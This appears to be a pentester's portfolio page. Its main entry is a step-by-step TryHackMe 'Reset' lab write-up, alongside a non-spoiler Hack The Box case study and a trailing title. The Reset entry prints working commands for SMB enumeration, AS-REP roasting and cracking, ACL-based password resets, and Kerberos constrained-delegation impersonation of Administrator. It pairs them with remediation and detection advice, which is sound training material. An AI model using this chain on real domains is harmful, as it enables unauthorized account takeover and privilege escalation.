title: TryHackMe Reset (Hard) — Full Active Directory Pentest Walkthrough
tags: tryhackme, reset, active-directory, bloodhound, asrep-roasting, kerberos, constrained-delegation, impacket, smb, pentest, red-team
content: Room: TryHackMe — Reset Difficulty: Hard · Completed: 30 October 2026 · Author: Kossi Richard Allado (allakori) Lab domain: thm.corp · Host: HAYSTACK / haystack.thm.corp · Lab IP during my session: 10.128.171.57 Sensitive values: Passwords, cracked hashes and flag contents are not published. 0. Introduction: what this write-up documents On 30 October 2026, I completed Reset, an Active Directory challenge marked Hard on TryHackMe. Ironically, once I understood its permissions graph, it felt like the easiest Active Directory room I had tackled so far. This is my technical reconstruction from the commands and outputs I retained during that session, not a claim that I have a perfect unbroken terminal recording. I have therefore marked three kinds of evidence throughout: Recorded: I preserved the actual command or its output from my session. Where a command originally contained a password, only that argument is replaced with a variable or [REDACTED]. Reconstructed command: Equivalent syntax for an operation I performed, but not a verbatim command I can prove I typed. Observed outcome: My retained output establishes that the step worked; any omitted intermediate activity is called out explicitly. This distinction matters. A useful pentest report should help readers understand both the exploit mechanics and the reliability of the evidence. Attack chain overview Here is the actual progression I documented, with no secrets exposed: flowchart TD A["HAYSTACK / THM.CORP<br/>Windows & AD enumeration"] --> B["Anonymous SMB access<br/>Data/onboarding documents"] B --> C["Domain identity discovery<br/>AS-REP Roasting"] C --> D["TABATHA_BRITT<br/>Cracked AS-REP credentials"] D --> E["BloodHound: GenericAll<br/>control over SHAWNA_BRAY"] E --> F["SHAWNA_BRAY<br/>ForceChangePassword"] F --> G["CRUZ_HALL<br/>ForceChangePassword"] G --> H["DARLA_WINTERS<br/>Kerberos constrained delegation"] H --> I["S4U2Self / S4U2Proxy<br/>Administrator CIFS service ticket"] I --> J["Kerberos SMB access to C$<br/>Both room objectives verified"] Important nuance: My preserved initial SMB-document evidence does not demonstrate every step by which I derived the AS-REP target list. I do not present a third-party foothold technique as my own when I do not have its original terminal evidence. 1. Reconnaissance — identify the domain controller I started with service enumeration against the lab-provided IP. The observed open ports in the retained scan were: TCP port Service / role Why it mattered 53 DNS Windows domain name resolution 88, 464 Kerberos / kpasswd Domain authentication and credential policy 135, 139 RPC / NetBIOS Windows remote procedure and discovery interfaces 389 LDAP Domain objects and identities 445 SMB Shared files, authentication and share permissions 593 RPC over HTTP Additional Windows RPC surface 636 LDAPS-facing endpoint TLS/LDAP surface; scan result requires interpretation 3268, 3269 Global Catalog Directory queries 3389 RDP Remote desktop, not proof that a user may log in 5985 WinRM / HTTP Remote PowerShell administration The host identified itself as HAYSTACK in the THM.CORP domain. The environment was clearly Windows/Active Directory. Nmap — reproducible command The specific full original scan invocation was not preserved; the following reproduces the relevant discovery approach: # Reconstructed equivalent — the IP is from my session, not a permanent room IP. nmap -Pn -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,3389,5985 \ 10.128.171.57 Takeaway: An open port is a lead, not a vulnerability. For this machine, SMB, Kerberos and LDAP were more useful investigative starting points than treating every service as independently exploitable. 2. SMB: anonymous access and onboarding material The first useful finding was that the data share was accessible without valid domain credentials. That made its contents worth reviewing before trying more aggressive tests. 2.1 Connect to the share Recorded command — 30 October 2026: smbclient //10.128.171.57/data -N Here, -N tells smbclient not to prompt for a password. I then explored the available files and found an onboarding directory containing a PDF with a randomized filename. Recorded file-listing detail (other entries omitted): x5oa55w5.0vj.pdf 3032659 bytes A readable onboarding document is not automatically a critical vulnerability. The decisive question is what information it contains and who can read it. 2.2 Download and inspect the onboarding PDF This part is now grounded in my 30 October 2026 SMB session, not just a generic illustration. I kept the exact commands and redacted the one sensitive value in the extracted document. Recorded SMB commands — from the anonymous connection: $ smbclient //10.128.171.57/data -N smb: \\> cd onboarding smb: \\onboarding\\> prompt off smb: \\onboarding\\> mget * cd onboarding enters the directory discovered in the share. prompt off disables confirmation for each file and mget * downloads the files in that directory. The precise full download progress lines were not retained; the commands and the PDF filename were. Relevant directory entry from the original listing (other entries omitted): x5oa55w5.0vj.pdf 3032659 bytes After downloading the PDF, I extracted its text: Recorded terminal command: $ pdftotext x5oa55w5.0vj.pdf - The trailing - sends extracted text to standard output. That makes it possible to inspect the document without modifying its contents or creating a new text file. Extracted PDF text — selected excerpt, original spelling retained, password redacted: The Art of Effective User Onboarding ... Example Email Subject: Welcome to Reset Dear LILY ONEILL, The initial passowrd is: [REDACTED] Best regards, The Reset Team ... Why these specific lines matter: Subject: Welcome to Reset identifies the document as an onboarding example/message rather than a system banner. Dear LILY ONEILL associates the credential-like instruction with an identifiable account. The initial passowrd is: [REDACTED] is the sensitive evidence. The typo passowrd is present in the original PDF; I have not corrected it to avoid changing the evidence. The rest of the PDF is omitted because it does not add to the finding. No password, cracked hash or flag appears in this article. Crucially, recovering a password-like string from a document is not the same as validating an account. My later authentication checks and the separate AS-REP Roasting result must be evaluated on their own merits; I do not claim that the PDF password provided the eventual privileged access. 2.3 Why this output matters The interesting part is not the PDF filename or the pdftotext command alone. The output answers a concrete security question: Exposure: an onboarding document was readable from a share accessible without a domain password. Sensitive content: the extracted text associated an identifiable domain user, LILY_ONEILL, with an initial-password instruction. Risk: if a real, valid credential is placed in such a document, an unauthorized reader could attempt to use it. This is an information-exposure finding, not automatically proof of administrative access. Important validation limit: Finding a password in an onboarding PDF did not mean that it worked as a domain-user credential. I tested the account and documented the result below, then moved to Kerberos account enumeration. In a professional report, this distinction would be explicit: Evidence Conclusion Anonymous/no-password SMB connection succeeds The share can be reached without supplying a domain password PDF contains The initial passowrd is: [REDACTED] Credential-like material is exposed in the document SMB test as LILY_ONEILL returns (Guest) Guest-mapped SMB access is not proof of a valid domain-user session LDAP attempt returns Connection reset by peer LDAP authentication was not established; the error does not definitively indicate a wrong password AS-REP Roasting reveals TABATHA_BRITT and subsequent SMB authentication succeeds A separately recovered, validated domain account enabled the later AD enumeration and ACL assessment Remediation: Remove plaintext credentials from onboarding templates; prevent unauthenticated reading of sensitive shares; provide initial secrets via an appropriate secure enrollment channel; rotate exposed passwords; and verify file-level permissions, not just share-level access. 2.4 Testing the onboarding account: why I did not continue with LILY_ONEILL The PDF was a useful information-disclosure finding, but I still needed to check whether the credentials provided genuine access. I tested the named account with NetExec against SMB and LDAP. The historical results below come from my 30 October 2026 session; the password is replaced with [REDACTED]. SMB credential test — command reconstructed from the retained test context: # The password supplied to NetExec was the value found in the onboarding PDF. # Its literal value has been removed from this write-up. nxc smb 10.128.171.57 -u 'LILY_ONEILL' -p '[REDACTED]' -d thm.corp SMB result — original relevant line with only the password redacted: SMB 10.128.171.57 445 HAYSTACK [+] thm.corp\LILY_ONEILL:[REDACTED] (Guest) The crucial detail is (Guest). NetExec reported a guest-mapped SMB context, not a confirmed authenticated session as THM.CORP\LILY_ONEILL. In other words, I could not use this output to claim that the password from the PDF was a valid domain credential. The plus sign by itself was not enough: the security context mattered. I also tried LDAP with the same account. LDAP credential test — equivalent sanitized syntax; the precise historical invocation was not retained: nxc ldap 10.128.171.57 -u 'LILY_ONEILL' -p '[REDACTED]' -d thm.corp LDAP result — relevant error from my recorded output: LDAP 10.128.171.57 389 HAYSTACK [-] Error connecting to the domain Error: [Errno 104] Connection reset by peer Interpretation: The LDAP connection was reset by the peer. This did not demonstrate successful LDAP authentication, but neither did it prove conclusively that the password was incorrect. A transport-level reset can have several explanations, so it would be wrong to label this simply as invalid credentials. Decision point — why I pivoted: I had extracted a potentially sensitive password from a publicly readable document, but I did not have reliable authenticated domain access through LILY_ONEILL. Rather than building the rest of the attack on an unverified credential, I continued identity enumeration and investigated Kerberos pre-authentication weaknesses. That led to the AS-REP Roasting of TABATHA_BRITT. Its recovered password was subsequently validated against SMB, giving me a reliable account for further Active Directory enumeration and ACL analysis. Key lesson: A disclosed password is a lead, not a foothold. Always distinguish a guest-mapped SMB connection, a transport error, and a successfully authenticated domain identity. 3. From domain usernames to AS-REP Roasting The onboarding PDF exposed an initial-password instruction, but my SMB test of LILY_ONEILL was mapped to Guest, and the LDAP connection was reset. I could not honestly treat that credential as a confirmed foothold. The next productive stage was to identify domain users and test whether any account could be AS-REP Roasted. 3.1 Where does users.txt come from? Important distinction: My retained 30 October terminal excerpt proves the later John the Ripper result for TABATHA_BRITT, but it does not preserve the command I originally used to enumerate usernames or create a file named users.txt. I cannot label an invented RID enumeration transcript as my own. For a reader reproducing this authorized lab, RID brute-force over SMB is a workable way to build that list. Independent walkthroughs of the same room demonstrate this route. The following is a reproducible alternative, not a recovered command from my terminal. Step A — Enumerate domain identities: TARGET=10.128.171.57 nxc smb "$TARGET" -u 'Guest' -p '' --rid-brute 2000 | tee rid_enum.txt -u 'Guest' -p '' requests a guest-style SMB connection, rather than pretending that the password exposed in the onboarding PDF was accepted for domain access. --rid-brute 2000 asks NetExec to test domain RIDs in that range to discover names. A SidTypeUser entry represents a user; SidTypeGroup is not a user for the next step. tee rid_enum.txt keeps the complete output for review. The filename is arbitrary; the important part is retaining the output before parsing it. Illustrative output structure — NOT a verbatim snapshot from my 30 October session: SMB 10.128.171.57 445 HAYSTACK <RID>: THM\EXAMPLE_USER (SidTypeUser) SMB 10.128.171.57 445 HAYSTACK <RID>: THM\TABATHA_BRITT (SidTypeUser) SMB 10.128.171.57 445 HAYSTACK <RID>: THM\Domain Users (SidTypeGroup) The <RID> placeholders are illustrative, not historical values. The useful parts are the DOMAIN\username format and the (SidTypeUser) suffix; these let us extract only user identities. Step B — Extract actual usernames into users.txt: grep 'SidTypeUser' rid_enum.txt \ | sed -nE 's/.*\\([^\\[:space:]]+)[[:space:]]+\(SidTypeUser\).*/\1/p' \ | sort -u > users.txt wc -l users.txt head users.txt grep -x 'TABATHA_BRITT' users.txt grep keeps user objects and excludes group/computer objects. sed removes the RID, domain prefix and NetExec annotations, leaving a username on each line. sort -u removes duplicates. wc, head and grep -x verify the resulting file rather than assuming it is correctly formatted. Expected file format (example, not claimed as a complete historical list): ERNESTO_SILVA LEANN_LONG TABATHA_BRITT Why this matters: users.txt is not TryHackMe’s user.txt flag. The former is a locally created input list of account names for GetNPUsers; the latter is an objective file found later in the challenge. If the enumeration returns STATUS_ACCESS_DENIED or no user lines: first confirm the identity and the target with nxc smb "$TARGET" -u 'Guest' -p '' --shares. Do not fabricate a list or assume guest access worked. Review the actual SMB context and any permitted user-discovery techniques available in your lab. If you have legitimately discovered one specific username, GetNPUsers also supports querying that identity directly (see below). 3.2 Request AS-REP responses with Impacket Kerberos pre-authentication normally prevents arbitrary account requests from yielding material suitable for offline password guessing. If a user has the Do not require Kerberos preauthentication setting, an unauthenticated requester may be able to obtain an encrypted AS-REP response. Whether that yields a password depends on password strength and the available wordlist. Reconstructed, reproducible command using the list produced above: impacket-GetNPUsers 'thm.corp/' \ -dc-ip "$TARGET" -no-pass -request \ -usersfile users.txt -format john \ -outputfile asrep.hashes test -s asrep.hashes && echo "[+] AS-REP output saved" || echo "[-] No AS-REP hashes saved" -usersfile users.txt supplies the accounts we enumerated and extracted; it does not discover them by itself. -no-pass makes the request without a previously authenticated password. -request requests roastable material from the KDC. -format john generates a format usable by John the Ripper. -outputfile asrep.hashes creates the input for the cracking step; test -s checks that it actually contains data. Representative result types (not my exact original GetNPUsers output): [-] User <NON_ROASTABLE_ACCOUNT> doesn't have UF_DONT_REQUIRE_PREAUTH set $krb5asrep$...TABATHA_BRITT@THM.CORP: [AS_REP_MATERIAL_REDACTED] The first line is not a failure of the entire assessment: it means that account does not allow this technique. The second type of result is what makes offline analysis possible. The original hash bytes must not be published. If you only have one username and no valid list, the tool can instead check that particular account: # Alternative only, once the target username is legitimately known. impacket-GetNPUsers 'thm.corp/TABATHA_BRITT' \ -dc-ip "$TARGET" -no-pass -request -format john This direct-query alternative is useful diagnostically; it does not establish how I originally identified TABATHA_BRITT. 3.3 Crack the response — recorded John command Unlike the initial username-discovery and GetNPUsers steps, the John command was retained in my 30 October session: john --format=krb5asrep \ --wordlist=/usr/share/wordlists/rockyou.txt \ asrep.hashes Recorded success, shortened and redacted: [REDACTED PASSWORD] ($krb5asrep$23$TABATHA_BRITT@THM.CORP) This established that a password for TABATHA_BRITT could be recovered offline. The file asrep.hashes existed at the time of cracking, but the retained record does not prove which exact username-enumeration command generated the earlier input. If John reports No password hashes loaded, check that asrep.hashes is non-empty, that the capture format matches --format=krb5asrep, and that you did not accidentally save command output or error lines in place of hash material. 3.4 Validate credentials and choose the next pivot A cracked password is not yet proof of interactive access. Here is how I re-express my successful NetExec check without publishing the secret: read -rsp 'TABATHA_BRITT password: ' TABATHA_PASS; echo nxc smb "$TARGET" \ -u TABATHA_BRITT -p "$TABATHA_PASS" -d thm.corp Observed: SMB authentication succeeded. An attempted WinRM session using that account did not establish a usable shell. This tells us something valuable: Test What it establishes AS-REP response returned Account is eligible for offline password testing John reports a recovered password Offline guess succeeded NetExec SMB authenticates Credentials work for the tested SMB authentication context WinRM login fails No authorized interactive shell was established by that test BloodHound later finds AD object rights Other privileged operations may still be possible without a shell Decision: Instead of assuming that TABATHA_BRITT was useless because WinRM failed, I used the validated domain credentials to assess directory permissions with BloodHound. That is the bridge into the next stage of the write-up. 4. BloodHound: turn domain rights into a testable path With an authenticated domain identity, I collected Active Directory relationship information using BloodHound-Python. Recorded BloodHound collection, password redacted This is the original tool/argument structure from my session; only the inline password is replaced with the shell variable already defined above: bloodhound-python \ -u TABATHA_BRITT -p "$TABATHA_PASS" \ -d thm.corp -ns 10.128.171.57 -c all The recorded collection output reported: Found 42 users Found 55 groups Found 3 gpos Found 222 ous Found 19 containers Found 0 trusts These counts describe collected directory objects; they are not counts of vulnerabilities or compromised accounts. How to use the BloodHound collection My recorded command produced domain information for 42 users, 55 groups, 3 GPOs, 222 OUs, 19 containers and 0 trusts. The counts alone do not reveal the escalation path. For readers who get stuck here, the practical workflow is: Confirm collection succeeded and locate the resulting JSON/ZIP files in the working directory. The exact output filenames depend on collector version and whether --zip was specified. Import those results into your installed BloodHound edition (the import interface differs between legacy BloodHound and BloodHound CE). Search for TABATHA_BRITT, mark it as the currently controlled identity and inspect its outbound object-control relationships. Follow each relevant edge one object at a time. Check the edge type and target identity; do not guess that every connection implies Domain Admin rights. Verify the resulting actions in the lab and record which identity is controlled after each step. Troubleshooting: If the collection reports a domain-controller DNS error, check name resolution before inventing other attack paths: getent hosts haystack.thm.corp dig @10.128.171.57 haystack.thm.corp +short You can provide the appropriate lab domain mapping in your local resolver/hosts configuration if necessary. A working SMB connection by IP does not guarantee that BloodHound’s LDAP, Kerberos and DNS requests will resolve the correct FQDN. Why the graph is useful here: TABATHA_BRITT did not need to become a local Administrator through WinRM first. Its AD permissions provided a different, directory-level path forward. BloodHound’s real value is in relations between principals, objects, and effective permissions. The path I identified was: TABATHA_BRITT | | GenericAll v SHAWNA_BRAY | | ForceChangePassword v CRUZ_HALL | | ForceChangePassword v DARLA_WINTERS | | Kerberos constrained delegation v CIFS service on haystack.thm.corp Why these edges matter GenericAll: The principal can exercise very broad control over the target AD object. If a user object is controlled in this way, the attacker may be able to modify security-relevant properties, including the credential state, depending on the effective permission and protections. ForceChangePassword: This delegated right can permit a principal to reset the target account’s password without knowing its previous password. It is distinct from knowing or cracking that password. Constrained delegation: A trusted service account may request tickets to specific downstream SPNs on behalf of another identity. Compromise of the account that controls this configuration can cross a particularly sensitive identity boundary. The key mistake would be to treat every BloodHound edge as automatically exploitable. Here, I validated the sequence by changing the relevant test-account passwords and authenticating with each new identity. 5. Chaining password-reset rights My October terminal session contained three successful password-reset operations using Samba’s net rpc password command: TABATHA_BRITT → SHAWNA_BRAY, enabled by GenericAll. SHAWNA_BRAY → CRUZ_HALL, using ForceChangePassword. CRUZ_HALL → DARLA_WINTERS, using ForceChangePassword. Below are the same operation patterns, with passwords replaced by variables. The actual commands I ran used inline secrets; I do not republish them. 5.1 TABATHA_BRITT controls SHAWNA_BRAY # Prompt for a password without exposing it in this write-up. read -rsp 'New lab password for SHAWNA_BRAY: ' SHAWNA_PASS; echo net rpc password 'SHAWNA_BRAY' "$SHAWNA_PASS" \ -U "THM.CORP/TABATHA_BRITT%$TABATHA_PASS" \ -S haystack.thm.corp Expected behavior and observed outcome: The command succeeded in my session; the newly controlled identity could then be used in authenticated tests. 5.2 SHAWNA_BRAY controls CRUZ_HALL read -rsp 'New lab password for CRUZ_HALL: ' CRUZ_PASS; echo net rpc password 'CRUZ_HALL' "$CRUZ_PASS" \ -U "THM.CORP/SHAWNA_BRAY%$SHAWNA_PASS" \ -S haystack.thm.corp Observed outcome: The operation worked, and later credentials for CRUZ_HALL were successfully validated. 5.3 CRUZ_HALL controls DARLA_WINTERS read -rsp 'New lab password for DARLA_WINTERS: ' DARLA_PASS; echo net rpc password 'DARLA_WINTERS' "$DARLA_PASS" \ -U "THM.CORP/CRUZ_HALL%$CRUZ_PASS" \ -S haystack.thm.corp Observed outcome: This gave me control of the identity DARLA_WINTERS, the key account for the next phase. Why this technique worked Each step was authorized by an overly permissive AD object relationship. No previous target-account password was needed for a delegated reset. The escalated capability came from the ACL, not from cracking three additional hashes. For each reset, validating SMB authentication with the resulting identity is more meaningful than merely assuming the password changed because a command returned without a visible exception. How to verify those password resets without publishing the passwords: # Run after each password reset, supplying the new password from that step. nxc smb "$TARGET" -u SHAWNA_BRAY -p "$SHAWNA_PASS" -d thm.corp nxc smb "$TARGET" -u CRUZ_HALL -p "$CRUZ_PASS" -d thm.corp nxc smb "$TARGET" -u DARLA_WINTERS -p "$DARLA_PASS" -d thm.corp A successful authentication for the specific next identity is the key observation. The precise full SMB output for all three checks is not retained, so I do not manufacture three identical “success” banners. If authentication fails, verify which account performed the reset, the edge’s effective permission, any password-policy constraints and whether the target was a protected object. A practical lesson: If a domain user has no direct route to an administrator group, inspect the transitive rights graph. Delegated administration can unintentionally connect several apparently low-privilege identities to a high-impact service account. 6. Kerberos constrained delegation — S4U2Self and S4U2Proxy Once I controlled DARLA_WINTERS, I investigated the delegated service access represented in the AD data. What’s happening technically? For a properly configured constrained-delegation scenario, the S4U extensions let an eligible service obtain a service ticket for a user: S4U2Self: the service requests a ticket to itself representing the named user, within the applicable Kerberos rules. S4U2Proxy: the service uses the prior ticket to request a ticket for a permitted downstream service principal. SPN: the service principal name specifies which service the final ticket is intended for. This matters because a service ticket is not the user’s password. The ticket can confer access to a particular service without the attacker ever learning that user’s secret. Impacket getST — actual successful command, secret redacted This command was executed in my session. Only the password argument is substituted: impacket-getST \ -spn 'cifs/haystack.thm.corp' \ -impersonate Administrator \ -dc-ip 10.128.171.57 \ "thm.corp/DARLA_WINTERS:$DARLA_PASS" The actual command output included the following lines: [*] Getting TGT for user [*] Impersonating Administrator [*] Requesting S4U2self [*] Requesting S4U2Proxy [*] Saving ticket in Administrator@cifs_haystack.thm.corp@THM.CORP.ccache These are the decisive facts: The operation progressed through both S4U stages. The requested impersonated identity was Administrator. The resulting ticket was for the CIFS service on the target host. Impacket wrote a local Kerberos cache file. What this does not prove: I did not recover the Administrator’s plaintext password. My next step was to prove the actual scope of access by using the ticket. 7. Kerberos SMB access and verification of both objectives 7.1 Set the ticket cache This exact export command was recorded in my terminal: export KRB5CCNAME="$PWD/Administrator@cifs_haystack.thm.corp@THM.CORP.ccache" KRB5CCNAME tells Kerberos-aware clients which cache to consult. It is easy to confuse a valid ticket with a usable ticket: a wrong cache path, host name or SPN can make the final command fail even if ticket issuance succeeded. 7.2 Connect with Impacket SMBClient The next command is verbatim from my successful session: impacket-smbclient -k -no-pass -target-ip 10.128.171.57 \ 'thm.corp/Administrator@haystack.thm.corp' Why these options? -k: use Kerberos authentication. -no-pass: do not prompt for or supply an account password; rely on existing Kerberos material. -target-ip: specify the lab IP while preserving the DNS/SPN host name in the target identity. A successful SMB connection demonstrates that the CIFS service accepted the ticket. It should not be described as a full Administrator interactive shell or as knowledge of the Administrator password. 7.3 Inspect the administrative share My retained interaction then navigated through the SMB client: shares use C$ cd Users cd Administrator cd Desktop cat root.txt Observed: The room’s root objective was present in the Administrator Desktop location and was successfully retrieved. I also reached the automate user profile and verified user.txt. Neither value is included here. Objective 1: user.txt — VERIFIED (contents withheld) Objective 2: root.txt — VERIFIED (contents withheld) This gave me a concrete, validated result beyond graph analysis or ticket issuance: the delegated authentication path provided access to a sensitive administrative file share. 8. Troubleshooting the complete lab workflow Where you are stuck Check this first Next justified action SMB Data cannot be listed Is the IP current? Does the attempted anonymous/Guest security context have access? Enumerate shares, distinguish Guest from real domain authentication LILY_ONEILL has a password but SMB shows (Guest) Was the account truly authenticated, or only guest-mapped? Do not claim a foothold; continue domain-user discovery users.txt does not exist The file must be built from an enumeration result Run a permitted RID enumeration and parse only SidTypeUser entries users.txt is empty Did RID enumeration return SidTypeUser entries? Does the parsing pattern match? Inspect rid_enum.txt directly; do not continue with an empty list GetNPUsers returns no usable hashes Did the query include real usernames? Is the KDC reachable? Verify wc -l users.txt, domain and DC IP; test a known eligible account John loads no hashes Is asrep.hashes non-empty and actually in John format? Inspect the safe metadata and regenerate the capture if necessary TABATHA works on SMB but not WinRM Are credentials valid but remote-shell permissions absent? Continue directory rights analysis rather than guessing a shell exploit BloodHound collects nothing Is lab DNS working? Was the correct domain/controller selected? Fix name resolution and rerun authorized collection A password reset appears to succeed but the next identity fails Does the caller really have the displayed ACL edge? Is the password compliant? Check the specific relationship and validate that account separately getST does not save a ticket Is the SPN permitted for delegation? Is the user eligible to be impersonated? Inspect Impacket’s exact error and delegation configuration Ticket saved but SMB fails Is KRB5CCNAME pointing to the new .ccache? Does the target hostname match the SPN? Check klist, FQDN resolution and the service identity File-access objective is unavailable Did the ticket grant access to this particular service and share? Inspect accepted identity and share rights; never infer full Administrator logon from ticket issuance No fabricated evidence: This table is a troubleshooting guide based on the technologies and failures involved, not a claim that I personally encountered every error listed. 9. Root-cause analysis The point of a write-up is not simply that a series of commands worked. It should explain the organizational and technical conditions that allowed them to work. Finding Root cause Security impact Excessive exposure of onboarding material Shared files reachable outside the intended user population Credentials or operational details may leak AS-REP Roastable account with a weak password Kerberos pre-authentication exception and inadequate password strength Offline password recovery against a domain identity Overly permissive AD object ACLs Excessive GenericAll and delegated password-reset authority Transitive control of additional identities Sensitive constrained delegation Delegation permissions assigned to an account reachable through the ACL chain Service-ticket impersonation to sensitive service access These findings reinforce a central lesson: security impact is compositional. A single weak password might not provide remote shell access. Several rights that appear unimportant on their own can combine into a much more serious path. 10. Blue Team: hardening and detection Preventive controls Remove initial credentials and other secrets from broadly accessible onboarding material; review SMB ACLs and guest/anonymous access. Require Kerberos pre-authentication for normal user accounts and review exceptions; improve password quality. Audit AD ACL assignments, especially GenericAll, GenericWrite, WriteDACL and ForceChangePassword on sensitive objects. Reduce transitive administrative rights: investigate who can reset an account that itself controls another privileged identity. Restrict Kerberos delegation to the minimum required SPNs and protect service accounts from unnecessary object-control permissions. Review sensitive share permissions and service-account access, and retest each control after modification. Relevant detection hypotheses The following Windows security events are defensive telemetry recommendations, not a claim that these log lines were collected in my lab session: Activity Candidate telemetry What analysts should correlate Unusual Kerberos requests 4768, 4769 Account baseline, source, ticket pattern Password resets 4724 Initiator, target, time, delegated-right justification AD object changes 5136 where configured Target DN, attribute modified, actor AD permission changes 4670 / directory auditing as applicable Permission origin and effective security boundary Share access 5140, 5145 with auditing enabled Sensitive paths, identity and read/write action Privileged service access Authentication and file-access logs Ticket use, unexpected access to sensitive resources No single event is conclusive. Correlation across identity, Kerberos and file-access telemetry is far more useful than a rule that matches only one tool name. 11. What I would include in a professional pentest report In a client-facing report, I would separate the evidence, the root cause and the demonstrated impact: Scope: authorized host(s), domain, time window and test identity. Methodology: service mapping, SMB inspection, credential validation and identity-permission analysis. Evidence: commands and relevant redacted output, screenshots, permissions and their context. Exploitability: prerequisites for each action, including the difference between authentication and authorization. Impact: exactly which service or administrative action the controlled identity enabled. Remediation: minimum necessary ACLs, account hardening, delegation restrictions. Retest: prove the unauthorized path no longer functions while legitimate delegated workflows remain operational. Evidence provenance Step Status of my October 30 record Lab completion and difficulty Recorded Host/domain/port observations Recorded Anonymous SMB and onboarding PDF Recorded Full original SMB download command Not preserved; equivalent shown LILY_ONEILL SMB (Guest) and LDAP connection reset Recorded; credential redacted, exact command syntax reconstructed Username list creation (users.txt) Original command/file not preserved; reproducible RID-enumeration method shown and explicitly marked as such Original AS-REP request command Not preserved; equivalent shown John crack of TABATHA_BRITT Recorded NetExec authentication; WinRM failure Recorded BloodHound collection and object counts Recorded Permission relationships Recorded Three net rpc password operations Recorded; credentials redacted impacket-getST S4U request and output Recorded; credential redacted KRB5CCNAME and Kerberos SMB client Recorded verbatim Both room objectives Verified; flag values withheld 12. Conclusion Reset was rated Hard, but it became surprisingly straightforward once I followed the Active Directory permission relationships instead of searching endlessly for an unrelated exploit. The central sequence was: Kerberos credential recovery → ACL-based identity control → constrained delegation → service-specific Kerberos authentication → verified access. The strongest takeaway is broader than the room: a penetration tester should understand why a permission exists, who can use it, and what boundary it crosses. Successful pentesting is not a checklist of commands; it is a reproducible argument supported by evidence. I completed both objectives in this authorized TryHackMe environment. No plaintext passwords, cracked hashes or flag values have been published. Room: TryHackMe Reset · Portfolio: ALLAKORI · TryHackMe profile: allakori

title: Hack The Box — DanglingTree | Windows & Active Directory Pentest
tags: hackthebox, windows, active-directory, adcs, kerberos, dpapi, pentest, privilege-escalation
content: Platform: Hack The Box · Machine: DanglingTree · Difficulty: Medium · Environment: Windows / Active Directory · Status: Completed (user and root objectives). Executive summary DanglingTree is an authorized Hack The Box penetration-testing lab built around a Windows and Active Directory environment. I completed both objectives and documented how seemingly separate weaknesses in service exposure, application security, credential handling and identity permissions can contribute to a larger security impact. The main value of this exercise was attack-path analysis: connecting technical findings across layers instead of treating each exposed service or misconfiguration as an isolated issue. Scope note: This is a personal lab exercise, not a client engagement. While the machine is active, this public article is a detailed non-spoiler technical case study, not a step-by-step solution. 1. Environment and assessment objectives The lab combined Windows network services, an internal application and Active Directory identity infrastructure. My objectives were to: Map the reachable services and identify meaningful entry points. Assess authentication boundaries and exposure of sensitive information. Understand account privileges and delegated Active Directory permissions. Review certificate-based authentication and AD CS security controls. Validate the security impact and document defensive recommendations. The assessment was conducted within the authorized HTB environment. 2. Assessment workflow The following diagram represents the audit methodology, not the machine-specific exploitation chain. flowchart TD A["Reconnaissance & service mapping<br/>Nmap · SMB · LDAP · Kerberos"] --> B["Windows & application assessment<br/>Exposure · authentication boundaries"] B --> C["Identity & authorization review<br/>Accounts · privileges · ACLs"] C --> D["AD CS security review<br/>Templates · enrollment · permissions"] D --> E["Impact validation<br/>Evidence · objectives achieved"] E --> F["Reporting & remediation<br/>Root causes · defensive controls"] Phase A — Reconnaissance and service mapping I started by enumerating network-facing services and identifying which were relevant to a Windows domain environment. The goal was not to run every possible tool, but to connect observations to specific questions: Which services expose domain or host information? Which authentication mechanisms are in use? Where are the boundaries between externally reachable services and internal resources? Which observations require manual validation before being reported? Tools and protocols: Nmap, SMB, LDAP and Kerberos. Phase B — Windows and application security assessment I investigated the security of Windows-facing management functionality and an internal application encountered during the lab. The key question was whether the permissions granted at the application layer were consistent with the privileges available in the underlying Windows environment. This stage reinforced an important principle: application access and operating-system access must be assessed separately, even when the application runs inside a trusted network. Phase C — Credentials, accounts and Active Directory permissions After establishing the relevant identity context, I reviewed how credentials and permissions were managed. The work involved reasoning about: Sensitive application and backup material. Windows-protected credential data and DPAPI concepts. Account relationships, group membership and delegated rights. Whether an apparently limited account could influence a more privileged security principal. I treated access-control relationships as evidence to be verified, rather than assuming that a particular permission automatically meant full compromise. Tools and concepts: NetExec, Impacket, LDAP, DPAPI and Active Directory ACLs. Phase D — AD CS and certificate-based authentication The later analysis focused on Active Directory Certificate Services. I examined how certificate templates, their directory permissions and enrollment policies can affect the effective authentication privileges of domain users. This required distinguishing certificate-template configuration from the permissions governing who can change or use that configuration. The lab demonstrated why AD CS should be included in an Active Directory security review, not considered an isolated PKI component. Tools and concepts: Certipy, Kerberos, AD CS, certificate templates and PKINIT. Phase E — Validation and reporting I verified the lab objectives and documented the security impact of the observed weaknesses. The complete private research notes include the technical decision points and validation steps; this public version deliberately omits the target-specific sequence, credentials, flags and commands that would reveal the solution. 3. Technical findings and defensive lessons Security area Generalized observation Recommended control Network exposure Accessible Windows services can reveal valuable environment context. Restrict unnecessary access and review exposed management interfaces. Application boundaries A weakness in an internal application can have consequences beyond the application itself. Patch vulnerable software, segment services and limit service-account privileges. Credential protection Sensitive files and backups may expand the reach of a compromised identity. Apply least privilege, secure backups and rotate exposed secrets. AD permissions Delegated rights can create unexpected privilege relationships. Periodically audit ACLs, group membership and sensitive delegation. AD CS Template settings and permissions can affect domain authentication security. Audit certificate templates, enrollment rights and changes to AD CS configuration. Detection A single log source rarely captures a multi-stage identity attack. Correlate Windows, application, Kerberos and certificate-service events. These are defensive takeaways, not claims that a particular production system was assessed. 4. Tools and competencies demonstrated Reconnaissance: Nmap, SMB and LDAP enumeration, service interpretation. Windows / Active Directory: authentication concepts, identity relationships, ACL and delegated-permission analysis. Credential security: DPAPI concepts, sensitive-material exposure and access-boundary reasoning. PKI / AD CS: certificate-template review, enrollment security and Kerberos authentication. Reporting: documenting evidence, separating verified observations from hypotheses, and mapping findings to remediation. 5. Outcome User objective: completed. Root objective: completed. Technical scope covered: Windows services, application security, credential handling, Active Directory permissions and AD CS. Deliverable: an internal technical write-up plus this public, recruiter-friendly case study. This project demonstrates a completed, authorized Windows/AD pentest lab. It should not be confused with a professional penetration-testing assignment. 6. Full write-up availability The detailed, machine-specific write-up is retained separately. It will not be linked or reproduced here while the machine is active, because it contains solution details. For a recruiter reviewing my CV, this page documents the scope, methodology, tools, validated outcome and security lessons without disclosing the lab solution.

title: TryHackMe — VulnNet-RST | Active Directory attack-chain assessment
